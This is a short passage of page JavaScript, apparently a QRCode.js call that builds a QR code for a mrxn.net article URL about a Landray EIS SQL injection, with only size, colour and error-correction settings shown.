text: encodeURI("https://mrxn.net/jswz/landray-eis-fl\_define\_edit-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 